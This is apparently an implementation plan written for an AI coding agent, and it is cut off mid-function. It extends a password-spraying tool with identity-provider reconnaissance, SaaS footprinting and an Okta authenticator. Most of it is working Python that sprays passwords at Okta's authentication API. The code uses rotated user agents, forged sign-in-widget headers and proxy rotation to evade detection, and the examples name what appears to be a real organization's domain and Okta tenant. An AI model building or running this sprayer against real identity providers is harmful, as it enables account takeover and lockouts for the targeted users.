# Okta Spraying, IdP Recon, and SaaS Footprinting Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add three new CLI commands (`recon`, `okta-spray`, `footprint`) plus federation warnings in existing `spray`/`enum` commands, enabling CloudSpray to identify federated identity providers and spray Okta directly.

**Architecture:** New `cloudspray/recon/` package handles DNS-based IdP discovery and SaaS footprinting. New `cloudspray/spray/okta_auth.py` implements the Okta Primary Authentication API authenticator that plugs into the existing SprayEngine. The existing AuthResult enum, state DB, console reporter, Fireprox session, and reporting infrastructure are all reused without modification.

**Tech Stack:** Python 3, Click CLI, requests, dnspython (new dependency), existing Rich/SQLite/Fireprox infrastructure.

---

## Context for the Implementer

**Codebase layout:**
- `cloudspray/cloudspray/cli.py` -- All Click commands live here. The CLI group is at line 49. Commands: `enum`, `spray`, `post`, `report`, `format`.
- `cloudspray/cloudspray/spray/auth.py` -- Azure AD authenticator. Returns `SprayAttempt` dataclass.
- `cloudspray/cloudspray/spray/engine.py` -- Spray engine. Takes an authenticator + config + db + reporter, runs the spray loop with safety mechanisms.
- `cloudspray/cloudspray/constants/error_codes.py` -- `AuthResult` enum (SUCCESS, INVALID_PASSWORD, ACCOUNT_LOCKED, RATE_LIMITED, etc.). Already covers all Okta response types.
- `cloudspray/cloudspray/state/models.py` -- Dataclasses: `SprayAttempt`, `ValidCredential`, `LockedAccount`, `EnumResult`, `Token`.
- `cloudspray/cloudspray/state/db.py` -- `StateDB` SQLite layer. Context manager. Records attempts, credentials, enum results.
- `cloudspray/cloudspray/reporting/console.py` -- `ConsoleReporter` with `info()`, `error()`, `debug()`, `print_result()`, `summary_table()`, `banner()`.
- `cloudspray/cloudspray/utils.py` -- `normalize_email()`, `read_userlist()`, `read_password_list()`, `read_lines()`, `setup_logging()`.
- `cloudspray/cloudspray/proxy/session.py` -- `FireproxSession(provider, target_host)` -- a `requests.Session` subclass that rewrites URLs through API Gateway.
- `cloudspray/cloudspray/settings.py` -- `CloudSprayConfig` dataclass loaded from `config.json`. Contains `SprayConfig` with `delay`, `jitter`, `lockout_threshold`, `lockout_cooldown`, `shuffle_mode`.
- `cloudspray/cloudspray/enumerators/msol.py` -- `MSOLEnumerator` for reference on how enumerators work.
- `cloudspray/cloudspray/constants/user_agents.py` -- `USER_AGENTS` list of realistic browser UA strings.
- `cloudspray/requirements.txt` -- Current deps: msal, requests, rich, click, boto3, azure-*.

**Key patterns to follow:**
- Commands import heavy modules lazily inside the function body (see `spray_cmd` line 357).
- Commands call `_discover_tenant()` to validate the domain, then `_build_fireprox_session()` for proxy setup, then run their logic inside `with StateDB(...) as db:`, with a `finally` block that tears down proxies.
- The `Authenticator` class returns `SprayAttempt` dataclasses. The `SprayEngine` consumes them.
- `ConsoleReporter` is created once in the CLI group and passed via `ctx.obj["reporter"]`.
- No tests directory exists yet. Create `cloudspray/tests/` with proper `__init__.py` files.

**Important:** The existing `AuthResult` enum does NOT need modification. All Okta response types map cleanly to existing enum values.

---

## Task 1: Add dnspython dependency and create recon package skeleton

**Files:**
- Modify: `cloudspray/requirements.txt`
- Create: `cloudspray/cloudspray/recon/__init__.py`
- Create: `cloudspray/cloudspray/recon/discovery.py`
- Create: `cloudspray/cloudspray/recon/footprint.py`

**Step 1: Add dnspython to requirements.txt**

Add this line to `cloudspray/requirements.txt`:

```
dnspython>=2.4.0
```

**Step 2: Install updated dependencies**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && pip install -r requirements.txt`
Expected: dnspython installs successfully.

**Step 3: Create recon package with empty modules**

`cloudspray/cloudspray/recon/__init__.py`:
```python
"""IdP discovery and SaaS footprinting via DNS reconnaissance."""

from cloudspray.recon.discovery import ReconDiscovery
from cloudspray.recon.footprint import SaaSFootprinter

__all__ = ["ReconDiscovery", "SaaSFootprinter"]
```

`cloudspray/cloudspray/recon/discovery.py`:
```python
"""IdP discovery: tenant validation, federation detection, DNS-based IdP identification."""
```

`cloudspray/cloudspray/recon/footprint.py`:
```python
"""SaaS footprinting: DNS TXT/MX/CNAME/SPF analysis for attack surface mapping."""
```

**Step 4: Commit**

```bash
git add cloudspray/requirements.txt cloudspray/cloudspray/recon/
git commit -m "add recon package skeleton and dnspython dependency"
```

---

## Task 2: Implement DNS query helpers in discovery.py

**Files:**
- Create: `cloudspray/cloudspray/recon/discovery.py` (full implementation)
- Create: `cloudspray/tests/__init__.py`
- Create: `cloudspray/tests/recon/__init__.py`
- Create: `cloudspray/tests/recon/test_discovery.py`

**Step 1: Write the tests**

`cloudspray/tests/__init__.py`: empty file.

`cloudspray/tests/recon/__init__.py`: empty file.

`cloudspray/tests/recon/test_discovery.py`:
```python
"""Tests for IdP discovery and DNS-based recon."""

from unittest.mock import patch, MagicMock
import pytest

from cloudspray.recon.discovery import ReconDiscovery


class TestParseIdpFromUrl:
    """Test _parse_idp_from_url static method."""

    def test_okta_url(self):
        result = ReconDiscovery._parse_idp_from_url("https://lineage.okta.com/app/123")
        assert result == ("Okta", "lineage.okta.com")

    def test_adfs_url(self):
        result = ReconDiscovery._parse_idp_from_url("https://sts.contoso.com/adfs/ls")
        assert result == ("ADFS", "sts.contoso.com")

    def test_ping_url(self):
        result = ReconDiscovery._parse_idp_from_url("https://sso.pingidentity.com/idp/123")
        assert result == ("PingFederate", "sso.pingidentity.com")

    def test_pingfederate_path(self):
        result = ReconDiscovery._parse_idp_from_url("https://sso.contoso.com/pingfederate/idp")
        assert result == ("PingFederate", "sso.contoso.com")

    def test_duo_url(self):
        result = ReconDiscovery._parse_idp_from_url("https://sso-abc.duosecurity.com/saml")
        assert result == ("Duo", "sso-abc.duosecurity.com")

    def test_unknown_url(self):
        result = ReconDiscovery._parse_idp_from_url("https://login.example.com/sso")
        assert result == ("Unknown", "login.example.com")


class TestParseFederationFromTxt:
    """Test _parse_federation_from_txt with mocked DNS."""

    @patch("cloudspray.recon.discovery.dns.resolver.resolve")
    def test_finds_okta_in_txt(self, mock_resolve):
        mock_record = MagicMock()
        mock_record.to_text.return_value = '"DirectFedAuthUrl=https://lineage.okta.com/app/123"'
        mock_resolve.return_value = [mock_record]

        disco = ReconDiscovery("onelineage.com")
        idp_name, idp_host, fed_url = disco._parse_federation_from_txt()
        assert idp_name == "Okta"
        assert idp_host == "lineage.okta.com"
        assert "okta.com" in fed_url

    @patch("cloudspray.recon.discovery.dns.resolver.resolve")
    def test_no_federation(self, mock_resolve):
        mock_record = MagicMock()
        mock_record.to_text.return_value = '"v=spf1 include:spf.protection.outlook.com ~all"'
        mock_resolve.return_value = [mock_record]

        disco = ReconDiscovery("contoso.com")
        idp_name, idp_host, fed_url = disco._parse_federation_from_txt()
        assert idp_name is None
        assert idp_host is None
        assert fed_url is None

    @patch("cloudspray.recon.discovery.dns.resolver.resolve")
    def test_dns_nxdomain(self, mock_resolve):
        import dns.resolver
        mock_resolve.side_effect = dns.resolver.NXDOMAIN()

        disco = ReconDiscovery("nonexistent.invalid")
        idp_name, idp_host, fed_url = disco._parse_federation_from_txt()
        assert idp_name is None


class TestCheckAzureTenant:
    """Test Azure AD tenant discovery."""

    @patch("cloudspray.recon.discovery.requests.get")
    def test_tenant_found(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "issuer": "https://sts.windows.net/abc-123-def/"
        }
        mock_get.return_value = mock_resp

        disco = ReconDiscovery("contoso.com")
        tenant_id, namespace = disco._check_azure_tenant()
        assert tenant_id == "abc-123-def"

    @patch("cloudspray.recon.discovery.requests.get")
    def test_tenant_not_found(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 400
        mock_get.return_value = mock_resp

        disco = ReconDiscovery("nonexistent.invalid")
        tenant_id, namespace = disco._check_azure_tenant()
        assert tenant_id is None


class TestGetUserRealm:
    """Test getuserrealm.srf query."""

    @patch("cloudspray.recon.discovery.requests.get")
    def test_managed_realm(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "NameSpaceType": "Managed",
            "FederationBrandName": "Contoso",
        }
        mock_get.return_value = mock_resp

        disco = ReconDiscovery("contoso.com")
        ns_type, brand = disco._get_user_realm()
        assert ns_type == "Managed"
        assert brand == "Contoso"

    @patch("cloudspray.recon.discovery.requests.get")
    def test_federated_realm(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "NameSpaceType": "Federated",
            "FederationBrandName": "Lineage",
        }
        mock_get.return_value = mock_resp

        disco = ReconDiscovery("onelineage.com")
        ns_type, brand = disco._get_user_realm()
        assert ns_type == "Federated"
        assert brand == "Lineage"
```

**Step 2: Run tests to verify they fail**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/recon/test_discovery.py -v`
Expected: FAIL (ReconDiscovery not implemented yet)

**Step 3: Implement ReconDiscovery**

Write `cloudspray/cloudspray/recon/discovery.py`:
```python
"""IdP discovery: tenant validation, federation detection, DNS-based IdP identification.

Performs the automated version of the manual recon steps used to discover that
a domain federates authentication to an external IdP (Okta, ADFS, PingFederate, etc.).
Answers the question: "what should I spray against?"

Steps:
1. Azure AD OIDC discovery -- confirm tenant exists, extract tenant ID
2. getuserrealm.srf query -- get NameSpaceType (Managed/Federated), FederationBrandName
3. DNS TXT record lookup -- parse for DirectFedAuthUrl to detect external IdP
4. Autodiscover CNAME check -- determines if M365 services are in use
5. MX record check -- identifies mail provider
"""

from dataclasses import dataclass
from urllib.parse import urlparse

import dns.resolver
import requests


@dataclass
class ReconResult:
    """Results from IdP discovery for a domain."""

    domain: str
    tenant_id: str | None = None
    namespace_type: str | None = None
    federation_brand: str | None = None
    idp_name: str | None = None
    idp_host: str | None = None
    federation_url: str | None = None
    mail_provider: str | None = None
    mail_host: str | None = None
    autodiscover_cname: str | None = None
    has_m365: bool = False


class ReconDiscovery:
    """Automated IdP discovery and tenant reconnaissance.

    Args:
        domain: Target domain to investigate (e.g. "onelineage.com").
    """

    def __init__(self, domain: str):
        self._domain = domain

    def run(self, reporter) -> ReconResult:
        """Execute full recon sequence and return structured results.

        Args:
            reporter: ConsoleReporter for status messages.

        Returns:
            ReconResult with all discovered information.
        """
        result = ReconResult(domain=self._domain)

        # 1. Azure AD tenant check
        reporter.info(f"Checking Azure AD tenant for {self._domain}...")
        tenant_id, namespace = self._check_azure_tenant()
        result.tenant_id = tenant_id

        # 2. User realm check
        if tenant_id:
            reporter.info("Querying user realm info...")
            ns_type, brand = self._get_user_realm()
            result.namespace_type = ns_type
            result.federation_brand = brand

        # 3. DNS TXT federation check
        reporter.info("Checking DNS TXT records for federation...")
        idp_name, idp_host, fed_url = self._parse_federation_from_txt()
        result.idp_name = idp_name
        result.idp_host = idp_host
        result.federation_url = fed_url

        # 4. MX record check
        reporter.info("Checking MX records...")
        mail_provider, mail_host = self._check_mx()
        result.mail_provider = mail_provider
        result.mail_host = mail_host

        # 5. Autodiscover CNAME check
        reporter.info("Checking autodiscover CNAME...")
        autodiscover = self._check_autodiscover()
        result.autodiscover_cname = autodiscover
        result.has_m365 = autodiscover is not None and "outlook" in autodiscover.lower()

        return result

    def _check_azure_tenant(self) -> tuple[str | None, str | None]:
        """Query OIDC discovery endpoint for tenant existence.

        Returns:
            Tuple of (tenant_id, namespace) or (None, None) if not found.
        """
        url = f"https://login.microsoftonline.com/{self._domain}/.well-known/openid-configuration"
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code != 200:
                return None, None
            data = resp.json()
            issuer = data.get("issuer", "")
            # Issuer format: https://sts.windows.net/{tenant-id}/
            tenant_id = issuer.rstrip("/").split("/")[-1] if issuer else None
            return tenant_id, None
        except (requests.RequestException, ValueError):
            return None, None

    def _get_user_realm(self) -> tuple[str | None, str | None]:
        """Query getuserrealm.srf for namespace type and federation brand.

        Returns:
            Tuple of (namespace_type, federation_brand_name).
        """
        url = f"https://login.microsoftonline.com/getuserrealm.srf?login=user@{self._domain}&json=1"
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code != 200:
                return None, None
            data = resp.json()
            return data.get("NameSpaceType"), data.get("FederationBrandName")
        except (requests.RequestException, ValueError):
            return None, None

    def _parse_federation_from_txt(self) -> tuple[str | None, str | None, str | None]:
        """Check DNS TXT records for DirectFedAuthUrl pointing to an external IdP.

        Returns:
            Tuple of (idp_name, idp_host, federation_url) or (None, None, None).
        """
        try:
            answers = dns.resolver.resolve(self._domain, "TXT")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, Exception):
            return None, None, None

        for record in answers:
            txt = record.to_text().strip('"')
            if "DirectFedAuthUrl=" in txt:
                fed_url = txt.split("DirectFedAuthUrl=", 1)[1].strip('"')
                idp_name, idp_host = self._parse_idp_from_url(fed_url)
                return idp_name, idp_host, fed_url

        return None, None, None

    @staticmethod
    def _parse_idp_from_url(url: str) -> tuple[str, str]:
        """Identify the IdP vendor from a federation URL.

        Args:
            url: The DirectFedAuthUrl value from DNS TXT records.

        Returns:
            Tuple of (idp_name, hostname).
        """
        parsed = urlparse(url)
        host = parsed.hostname or ""
        path = parsed.path.lower()

        if ".okta.com" in host:
            return "Okta", host
        if "/adfs/" in path or "/adfs" in path:
            return "ADFS", host
        if ".pingidentity.com" in host or "/pingfederate/" in path:
            return "PingFederate", host
        if ".duosecurity.com" in host:
            return "Duo", host

        return "Unknown", host

    def _check_mx(self) -> tuple[str | None, str | None]:
        """Query MX records to identify the mail provider.

        Returns:
            Tuple of (provider_name, mx_host) or (None, None).
        """
        try:
            answers = dns.resolver.resolve(self._domain, "MX")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, Exception):
            return None, None

        # Take the highest priority (lowest preference number) MX record
        mx_records = sorted(answers, key=lambda r: r.preference)
        if not mx_records:
            return None, None

        mx_host = str(mx_records[0].exchange).rstrip(".")

        # Identify provider from MX hostname
        mx_lower = mx_host.lower()
        if "pphosted.com" in mx_lower or "proofpoint" in mx_lower:
            return "Proofpoint", mx_host
        if "protection.outlook.com" in mx_lower or "mail.protection" in mx_lower:
            return "Microsoft 365", mx_host
        if "google.com" in mx_lower or "googlemail.com" in mx_lower:
            return "Google Workspace", mx_host
        if "mimecast" in mx_lower:
            return "Mimecast", mx_host
        if "barracuda" in mx_lower:
            return "Barracuda", mx_host

        return "Unknown", mx_host

    def _check_autodiscover(self) -> str | None:
        """Check autodiscover CNAME to detect M365 usage.

        Returns:
            The CNAME target hostname, or None if not found.
        """
        try:
            answers = dns.resolver.resolve(f"autodiscover.{self._domain}", "CNAME")
            for record in answers:
                return str(record.target).rstrip(".")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, Exception):
            pass
        return None
```

**Step 4: Run tests to verify they pass**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/recon/test_discovery.py -v`
Expected: All tests PASS

**Step 5: Commit**

```bash
git add cloudspray/cloudspray/recon/discovery.py cloudspray/tests/
git commit -m "add ReconDiscovery with IdP detection, tenant check, DNS queries"
```

---

## Task 3: Implement SaaS footprinting

**Files:**
- Create: `cloudspray/cloudspray/recon/footprint.py` (full implementation)
- Create: `cloudspray/tests/recon/test_footprint.py`

**Step 1: Write the tests**

`cloudspray/tests/recon/test_footprint.py`:
```python
"""Tests for SaaS footprinting."""

from unittest.mock import patch, MagicMock
import pytest

from cloudspray.recon.footprint import SaaSFootprinter


class TestParseTxtServices:
    """Test TXT record parsing for SaaS verification strings."""

    def test_atlassian_detection(self):
        fp = SaaSFootprinter("example.com")
        services = fp._match_txt_services([
            "atlassian-domain-verification=abc123",
            "v=spf1 include:spf.protection.outlook.com ~all",
        ])
        assert "Atlassian" in services

    def test_multiple_services(self):
        fp = SaaSFootprinter("example.com")
        services = fp._match_txt_services([
            "atlassian-domain-verification=abc",
            "google-site-verification=xyz",
            "slack-domain-verification=123",
            "MS=ms38804948",
        ])
        assert "Atlassian" in services
        assert "Google Workspace" in services
        assert "Slack" in services
        assert "Microsoft 365" in services

    def test_no_services(self):
        fp = SaaSFootprinter("example.com")
        services = fp._match_txt_services(["v=spf1 ~all"])
        assert len(services) == 0


class TestParseSpf:
    """Test SPF record parsing."""

    def test_spf_includes(self):
        fp = SaaSFootprinter("example.com")
        includes = fp._parse_spf("v=spf1 include:spf.protection.outlook.com include:_spf.google.com ~all")
        assert "spf.protection.outlook.com" in includes
        assert "_spf.google.com" in includes

    def test_spf_no_includes(self):
        fp = SaaSFootprinter("example.com")
        includes = fp._parse_spf("v=spf1 ~all")
        assert len(includes) == 0

    def test_non_spf_record(self):
        fp = SaaSFootprinter("example.com")
        includes = fp._parse_spf("google-site-verification=abc")
        assert len(includes) == 0
```

**Step 2: Run tests to verify they fail**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/recon/test_footprint.py -v`
Expected: FAIL

**Step 3: Implement SaaSFootprinter**

Write `cloudspray/cloudspray/recon/footprint.py`:
```python
"""SaaS footprinting: DNS TXT/MX/CNAME/SPF analysis for attack surface mapping.

Parses all DNS records for a domain to identify every SaaS service in use.
TXT records contain domain verification strings that reveal the full SaaS
footprint (Atlassian, Slack, 1Password, DocuSign, etc.).
"""

from dataclasses import dataclass, field

import dns.resolver


# Maps TXT record prefixes to the SaaS service they identify.
# Each key is checked via str.startswith() against every TXT record value.
SAAS_TXT_PATTERNS: dict[str, str] = {
    "atlassian-domain-verification": "Atlassian",
    "google-site-verification": "Google Workspace",
    "slack-domain-verification": "Slack",
    "1password-site-verification": "1Password",
    "docusign=": "DocuSign",
    "MS=": "Microsoft 365",
    "adobe-idp-site-verification": "Adobe",
    "miro-verification": "Miro",
    "airtable-verification": "Airtable",
    "teamviewer-sso-verification": "TeamViewer",
    "box-domain-verification": "Box",
    "smartsheet-site-validation": "Smartsheet",
    "pardot": "Salesforce/Pardot",
    "ciscocidomainverification": "Cisco",
    "apple-domain-verification": "Apple",
    "mandrill_verify": "Mailchimp/Mandrill",
}

# Maps SPF include domains to their mail provider/service.
SPF_INCLUDE_MAP: dict[str, str] = {
    "spf.protection.outlook.com": "Microsoft 365",
    "_spf.google.com": "Google Workspace",
    "pphosted.com": "Proofpoint",
    "mimecast": "Mimecast",
    "sendgrid.net": "SendGrid",
    "mailgun.org": "Mailgun",
    "amazonses.com": "Amazon SES",
}


@dataclass
class FootprintResult:
    """Full SaaS footprint for a domain."""

    domain: str
    saas_services: list[str] = field(default_factory=list)
    mail_provider: str | None = None
    mail_host: str | None = None
    spf_includes: list[str] = field(default_factory=list)
    spf_services: list[str] = field(default_factory=list)
    dmarc_policy: str | None = None
    dmarc_record: str | None = None
    txt_records: list[str] = field(default_factory=list)


class SaaSFootprinter:
    """DNS-based SaaS footprinting for attack surface mapping.

    Args:
        domain: Target domain to investigate.
    """

    def __init__(self, domain: str):
        self._domain = domain

    def run(self, reporter) -> FootprintResult:
        """Execute full footprint analysis.

        Args:
            reporter: ConsoleReporter for status messages.

        Returns:
            FootprintResult with all discovered SaaS services.
        """
        result = FootprintResult(domain=self._domain)

        # Collect all TXT records
        reporter.info(f"Fetching TXT records for {self._domain}...")
        txt_values = self._get_txt_records()
        result.txt_records = txt_values

        # Match SaaS services
        result.saas_services = self._match_txt_services(txt_values)
        reporter.info(f"Found {len(result.saas_services)} SaaS service(s) in TXT records")

        # Parse SPF
        for txt in txt_values:
            if txt.startswith("v=spf1"):
                result.spf_includes = self._parse_spf(txt)
                result.spf_services = self._identify_spf_services(result.spf_includes)
                break

        # Check MX
        reporter.info("Checking MX records...")
        result.mail_provider, result.mail_host = self._check_mx()

        # Check DMARC
        reporter.info("Checking DMARC policy...")
        result.dmarc_policy, result.dmarc_record = self._check_dmarc()

        return result

    def _get_txt_records(self) -> list[str]:
        """Fetch all TXT records for the domain.

        Returns:
            List of TXT record string values.
        """
        try:
            answers = dns.resolver.resolve(self._domain, "TXT")
            return [record.to_text().strip('"') for record in answers]
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, Exception):
            return []

    def _match_txt_services(self, txt_records: list[str]) -> list[str]:
        """Match TXT records against known SaaS verification patterns.

        Args:
            txt_records: Raw TXT record values.

        Returns:
            Sorted list of unique SaaS service names found.
        """
        found: set[str] = set()
        for txt in txt_records:
            for prefix, service in SAAS_TXT_PATTERNS.items():
                if txt.startswith(prefix):
                    found.add(service)
        return sorted(found)

    def _parse_spf(self, spf_record: str) -> list[str]:
        """Extract include: domains from an SPF record.

        Args:
            spf_record: The full SPF TXT record value.

        Returns:
            List of included domain strings.
        """
        if not spf_record.startswith("v=spf1"):
            return []

        includes = []
        for part in spf_record.split():
            if part.startswith("include:"):
                includes.append(part.split(":", 1)[1])
        return includes

    def _identify_spf_services(self, includes: list[str]) -> list[str]:
        """Map SPF include domains to known services.

        Args:
            includes: List of SPF include domains.

        Returns:
            List of identified service names.
        """
        found: set[str] = set()
        for inc in includes:
            for pattern, service in SPF_INCLUDE_MAP.items():
                if pattern in inc:
                    found.add(service)
        return sorted(found)

    def _check_mx(self) -> tuple[str | None, str | None]:
        """Query MX records and identify the mail provider.

        Returns:
            Tuple of (provider_name, mx_host) or (None, None).
        """
        try:
            answers = dns.resolver.resolve(self._domain, "MX")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, Exception):
            return None, None

        mx_records = sorted(answers, key=lambda r: r.preference)
        if not mx_records:
            return None, None

        mx_host = str(mx_records[0].exchange).rstrip(".")
        mx_lower = mx_host.lower()

        if "pphosted.com" in mx_lower or "proofpoint" in mx_lower:
            return "Proofpoint", mx_host
        if "protection.outlook.com" in mx_lower:
            return "Microsoft 365", mx_host
        if "google.com" in mx_lower or "googlemail.com" in mx_lower:
            return "Google Workspace", mx_host
        if "mimecast" in mx_lower:
            return "Mimecast", mx_host

        return "Unknown", mx_host

    def _check_dmarc(self) -> tuple[str | None, str | None]:
        """Check DMARC record for the domain.

        Returns:
            Tuple of (dmarc_policy, full_record) or (None, None).
        """
        try:
            answers = dns.resolver.resolve(f"_dmarc.{self._domain}", "TXT")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, Exception):
            return None, None

        for record in answers:
            txt = record.to_text().strip('"')
            if txt.startswith("v=DMARC1"):
                # Extract the policy (p=none/quarantine/reject)
                for part in txt.split(";"):
                    part = part.strip()
                    if part.startswith("p="):
                        return part.split("=", 1)[1], txt
                return "unknown", txt

        return None, None
```

**Step 4: Run tests to verify they pass**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/recon/test_footprint.py -v`
Expected: All tests PASS

**Step 5: Commit**

```bash
git add cloudspray/cloudspray/recon/footprint.py cloudspray/tests/recon/test_footprint.py
git commit -m "add SaaS footprinting with TXT/MX/SPF/DMARC analysis"
```

---

## Task 4: Implement Okta authenticator

**Files:**
- Create: `cloudspray/cloudspray/spray/okta_auth.py`
- Create: `cloudspray/tests/spray/__init__.py`
- Create: `cloudspray/tests/spray/test_okta_auth.py`

**Step 1: Write the tests**

`cloudspray/tests/spray/__init__.py`: empty file.

`cloudspray/tests/spray/test_okta_auth.py`:
```python
"""Tests for Okta authenticator."""

from unittest.mock import patch, MagicMock
import pytest

from cloudspray.spray.okta_auth import OktaAuthenticator
from cloudspray.constants.error_codes import AuthResult


class TestOktaClassifyResponse:
    """Test response classification for Okta /api/v1/authn responses."""

    def test_success(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(200, {"status": "SUCCESS"})
        assert result == AuthResult.SUCCESS

    def test_mfa_required(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(200, {"status": "MFA_REQUIRED"})
        assert result == AuthResult.VALID_PASSWORD_MFA_REQUIRED

    def test_mfa_enroll(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(200, {"status": "MFA_ENROLL"})
        assert result == AuthResult.VALID_PASSWORD_MFA_ENROLLMENT

    def test_locked_out(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(200, {"status": "LOCKED_OUT"})
        assert result == AuthResult.ACCOUNT_LOCKED

    def test_password_expired(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(200, {"status": "PASSWORD_EXPIRED"})
        assert result == AuthResult.VALID_PASSWORD_EXPIRED

    def test_invalid_password_401(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(401, {"errorCode": "E0000004"})
        assert result == AuthResult.INVALID_PASSWORD

    def test_rate_limited_429(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(429, {"errorCode": "E0000047"})
        assert result == AuthResult.RATE_LIMITED

    def test_unknown_status(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(200, {"status": "SOMETHING_NEW"})
        assert result == AuthResult.UNKNOWN_ERROR

    def test_unknown_http_code(self):
        auth = OktaAuthenticator("lineage.okta.com")
        result = auth._classify_response(500, {})
        assert result == AuthResult.UNKNOWN_ERROR


class TestOktaAttempt:
    """Test the full attempt() method with mocked HTTP."""

    @patch("cloudspray.spray.okta_auth.requests.Session")
    def test_attempt_success(self, MockSession):
        mock_session = MockSession.return_value
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"status": "SUCCESS"}
        mock_session.post.return_value = mock_resp

        auth = OktaAuthenticator("lineage.okta.com")
        attempt = auth.attempt("user@onelineage.com", "Password1!")
        assert attempt.result == AuthResult.SUCCESS
        assert attempt.username == "user@onelineage.com"
        assert attempt.password == "Password1!"
        assert attempt.endpoint == "https://lineage.okta.com/api/v1/authn"

    @patch("cloudspray.spray.okta_auth.requests.Session")
    def test_attempt_invalid_password(self, MockSession):
        mock_session = MockSession.return_value
        mock_resp = MagicMock()
        mock_resp.status_code = 401
        mock_resp.json.return_value = {
            "errorCode": "E0000004",
            "errorSummary": "Authentication failed",
        }
        mock_session.post.return_value = mock_resp

        auth = OktaAuthenticator("lineage.okta.com")
        attempt = auth.attempt("user@onelineage.com", "WrongPass")
        assert attempt.result == AuthResult.INVALID_PASSWORD

    @patch("cloudspray.spray.okta_auth.requests.Session")
    def test_attempt_network_error(self, MockSession):
        import requests as req
        mock_session = MockSession.return_value
        mock_session.post.side_effect = req.ConnectionError("Connection refused")

        auth = OktaAuthenticator("lineage.okta.com")
        attempt = auth.attempt("user@onelineage.com", "Pass")
        assert attempt.result == AuthResult.UNKNOWN_ERROR
```

**Step 2: Run tests to verify they fail**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/spray/test_okta_auth.py -v`
Expected: FAIL

**Step 3: Implement OktaAuthenticator**

Write `cloudspray/cloudspray/spray/okta_auth.py`:
```python
"""Okta Primary Authentication API sprayer.

Implements password spraying against Okta's /api/v1/authn endpoint.
This is the dedicated Okta authenticator -- separate from the Azure AD
authenticator because Okta uses a completely different auth protocol
(direct JSON POST vs. MSAL ROPC) and needs different anti-fingerprinting
(Okta Sign-In Widget headers vs. Microsoft client ID rotation).

The authenticator returns SprayAttempt dataclasses, making it a drop-in
replacement for the Azure Authenticator when used with SprayEngine.
"""

import random
from datetime import datetime, timezone

import requests

from cloudspray.constants.error_codes import AuthResult
from cloudspray.constants.user_agents import USER_AGENTS
from cloudspray.state.models import SprayAttempt

# Maps Okta /api/v1/authn status values to our AuthResult enum.
_OKTA_STATUS_MAP: dict[str, AuthResult] = {
    "SUCCESS": AuthResult.SUCCESS,
    "MFA_REQUIRED": AuthResult.VALID_PASSWORD_MFA_REQUIRED,
    "MFA_ENROLL": AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,
    "MFA_CHALLENGE": AuthResult.VALID_PASSWORD_MFA_REQUIRED,
    "LOCKED_OUT": AuthResult.ACCOUNT_LOCKED,
    "PASSWORD_EXPIRED": AuthResult.VALID_PASSWORD_EXPIRED,
}

# Maps Okta error codes to AuthResult for non-200 responses.
_OKTA_ERROR_MAP: dict[str, AuthResult] = {
    "E0000004": AuthResult.INVALID_PASSWORD,  # Authentication failed
    "E0000047": AuthResult.RATE_LIMITED,       # API rate limit exceeded
}


class OktaAuthenticator:
    """Wraps Okta Primary Authentication API with anti-fingerprinting headers.

    Each call to attempt() sends a POST to /api/v1/authn with headers
    mimicking the Okta Sign-In Widget. The response is classified into
    the same AuthResult enum used by the Azure spray path.

    Args:
        okta_host: Full Okta hostname (e.g. "lineage.okta.com").
        proxy_session: Optional requests.Session with proxy routing.
            If None, a plain session is used.
    """

    def __init__(self, okta_host: str, proxy_session: requests.Session | None = None):
        self._okta_host = okta_host
        self._authn_url = f"https://{okta_host}/api/v1/authn"
        self._session = proxy_session or requests.Session()

    def attempt(self, username: str, password: str) -> SprayAttempt:
        """Perform a single Okta authentication attempt.

        Args:
            username: Full email address (e.g. "user@onelineage.com").
            password: Password to test.

        Returns:
            SprayAttempt with classified result.
        """
        user_agent = random.choice(USER_AGENTS)
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Okta-User-Agent-Extended": "okta-signin-widget-2.12.0",
            "User-Agent": user_agent,
        }
        payload = {"username": username, "password": password}

        proxy_url = ""
        result = AuthResult.UNKNOWN_ERROR
        error_code = ""

        try:
            resp = self._session.post(
                self._authn_url,
                json=payload,
                headers=headers,
                timeout=15,
            )

            # Track proxy URL if using FireproxSession
            if hasattr(self._session, "last_proxy_url"):
                proxy_url = self._session.last_proxy_url

            try:
                data = resp.json()
            except ValueError:
                data = {}

            error_code = data.get("errorCode", "")
            result = self._classify_response(resp.status_code, data)

        except requests.RequestException:
            result = AuthResult.UNKNOWN_ERROR

        return SprayAttempt(
            username=username,
            password=password,
